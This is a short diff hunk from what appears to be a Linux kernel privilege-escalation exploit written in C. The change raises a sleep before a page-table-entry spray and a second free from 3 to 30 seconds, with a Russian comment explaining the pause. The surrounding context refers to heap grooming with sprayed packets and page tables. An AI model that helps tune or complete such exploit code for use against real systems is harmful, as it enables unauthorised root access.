@@ -325,7 +325,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		//	PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
 		//	recv_ipv4_udp(1);
 		//}
-	sleep(3); //тут добавил сон перед залпом PTE и вторым освобождением
+	sleep(30); //тут добавил сон перед залпом PTE и вторым освобождением
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
